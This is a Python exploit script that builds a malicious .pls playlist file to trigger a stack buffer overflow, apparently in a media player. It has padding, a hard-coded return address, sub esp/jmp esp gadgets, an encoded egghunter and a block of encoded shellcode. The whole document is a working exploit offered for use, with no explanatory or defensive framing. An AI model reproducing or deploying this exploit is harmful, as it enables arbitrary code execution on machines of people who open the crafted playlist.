#!/usr/bin/env python

from struct import pack

subesp = b'\x83\xEC\x58'
jmpesp = b'\xFF\xE4'

# len: 126  - egg: JACK
egg =  b""
egg += b"\x89\xe2\xda\xd8\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49"
egg += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
egg += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
egg += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
egg += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x50\x66\x4f\x71\x68"
egg += b"\x4a\x39\x6f\x74\x4f\x52\x62\x56\x32\x72\x4a\x73\x32"
egg += b"\x66\x38\x48\x4d\x54\x6e\x35\x6c\x46\x65\x73\x6a\x43"
egg += b"\x44\x5a\x4f\x68\x38\x70\x4a\x33\x71\x71\x53\x70\x4b"
egg += b"\x4f\x79\x58\x57\x6c\x6f\x54\x35\x48\x6a\x6c\x6f\x50"
egg += b"\x75\x48\x67\x6b\x4f\x39\x77\x41\x41"

# !mona egg -t cr0w
# egg = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x63\x72\x30\x77\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

shellcode =  b""
shellcode += b"\xb8\xa0\x66\x80\x93\xdd\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x31\x31\x43\x13\x03\x43\x13"
shellcode += b"\x83\xc3\xa4\x84\x75\x6f\x4c\xca\x76\x90\x8c"
shellcode += b"\xab\xff\x75\xbd\xeb\x64\xfd\xed\xdb\xef\x53"
shellcode += b"\x01\x97\xa2\x47\x92\xd5\x6a\x67\x13\x53\x4d"
shellcode += b"\x46\xa4\xc8\xad\xc9\x26\x13\xe2\x29\x17\xdc"
shellcode += b"\xf7\x28\x50\x01\xf5\x79\x09\x4d\xa8\x6d\x3e"
shellcode += b"\x1b\x71\x05\x0c\x8d\xf1\xfa\xc4\xac\xd0\xac"
shellcode += b"\x5f\xf7\xf2\x4f\x8c\x83\xba\x57\xd1\xae\x75"
shellcode += b"\xe3\x21\x44\x84\x25\x78\xa5\x2b\x08\xb5\x54"
shellcode += b"\x35\x4c\x71\x87\x40\xa4\x82\x3a\x53\x73\xf9"
shellcode += b"\xe0\xd6\x60\x59\x62\x40\x4d\x58\xa7\x17\x06"
shellcode += b"\x56\x0c\x53\x40\x7a\x93\xb0\xfa\x86\x18\x37"
shellcode += b"\x2d\x0f\x5a\x1c\xe9\x54\x38\x3d\xa8\x30\xef"
shellcode += b"\x42\xaa\x9b\x50\xe7\xa0\x31\x84\x9a\xea\x5f"
shellcode += b"\x5b\x28\x91\x2d\x5b\x32\x9a\x01\x34\x03\x11"
shellcode += b"\xce\x43\x9c\xf0\xab\xbc\xd6\x59\x9d\x54\xbf"
shellcode += b"\x0b\x9c\x38\x40\xe6\xe2\x44\xc3\x03\x9a\xb2"
shellcode += b"\xdb\x61\x9f\xff\x5b\x99\xed\x90\x09\x9d\x42"
shellcode += b"\x90\x1b\xfe\x05\x02\xc7\x2f\xa0\xa2\x62\x30"

# only one subesp for some reason
plsPart1 = b'[playlist]\r\nFile1=\\\\'
plsFile1 = b'A' * (910) + b'\xCC' * (112) + pack('<I', 0x1a1e8c15) + subesp + subesp + jmpesp
plsPart2 = b'\r\nTitle1=LLamma Whippin\r\nLength1=5\r\nNumberOfEntries=1\r\nVersion=2\r\n'

with open('exp.pls', 'wb') as plsFile:
	plsFile.write(plsPart1 + plsFile1 + plsPart2)

